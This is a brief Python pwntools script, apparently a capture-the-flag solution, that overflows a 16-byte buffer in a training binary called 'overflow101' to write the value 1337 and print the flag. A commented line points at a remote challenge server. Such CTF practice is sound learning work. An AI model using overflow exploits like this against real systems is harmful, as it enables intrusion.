from pwn import *

#r = remote("overflow101.heltsikker.no", 9021)
r = process("./source/overflow101")

#exploit = b"A"*16 + b"\x39\x05"
exploit = b'A'*16 + p64(1337)

r.sendline(exploit)
r.recvuntil('flag!\n')
print(r.recvline())
